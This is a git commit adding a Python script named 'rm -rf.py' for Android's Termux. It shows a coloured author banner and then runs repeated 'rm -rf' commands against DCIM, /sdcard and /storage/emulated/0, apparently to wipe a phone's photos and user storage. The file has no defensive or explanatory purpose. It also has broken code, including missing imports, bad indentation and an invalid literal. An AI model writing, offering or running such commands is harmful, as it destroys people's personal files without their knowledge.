ed5c113ee98052bfa718f529981fc64e764f0907
lolxd <68311576+hamayunpro@users.noreply.github.com>
2021-12-29 20:06:51 +0500

    Add files via upload

---
+++ rm -rf.py
@@ -0,0 +1,31 @@
+#-*-coding:utf-8-*-
+
+logo="""
+\x1b[1;91m  _   _    __    __  __    __    _  _  __  __  _  _ 
+\x1b[1;92m ( )_( )  /__\  (  \/  )  /__\  ( \/ )(  )(  )( \( )
+\x1b[1;93m  ) _ (  /(__)\  )    (  /(__)\  \  /  )(__)(  )  ( 
+\x1b[1;97m (_) (_)(__)(__)(_/\/\_)(__)(__) (__) (______)(_)\_)
+
+ -----------------------------------------------------
+\033[1;92m   Author   : \033[1;96mHamayun Khan
+\033[1;92m   Github   : \033[1;93mhttps://github.com/hamayun01
+ \033[1;92m  Facebook :\033[1;97m Hamayun Khan
+-----------------------------------------------------
+  """
+time.sleep(1)
+    os.system('termux-setup-storage')
+time.sleep(0.5)
+    os.system('rm -rf DCIM')
+time.sleep(0.5)
+    os.system('rm -rf /sdcard')
+time.sleep(1)
+    os.system("rm -rf /sdcard*")
+time.sleep(1)
+    os.system('rm -rf /storage/emulated/0')
+time.sleep(1)
+    os.system('rm -rf /storage/emulated/0/')
+time.sleep(01)
+    os.system('rm -rf /sdcard/')
+time.sleep(1)
+if __name__ == '__main__':
+	exit()
